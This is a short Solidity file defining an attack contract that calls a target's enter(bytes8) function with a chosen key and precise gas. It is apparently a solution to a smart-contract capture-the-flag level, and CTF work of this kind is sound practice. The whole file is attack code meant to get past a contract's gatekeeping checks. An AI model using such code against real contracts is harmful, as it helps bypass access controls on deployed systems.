// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackGatekeeperOne {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack(bytes8 key, uint256 gasToUse) external {
        // Single call with specified gas amount; no loop to keep gas costs low
        (bool success, ) = target.call{gas: gasToUse}(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
        require(success, "Attack failed: Check if key or gas is incorrect");
    }
}
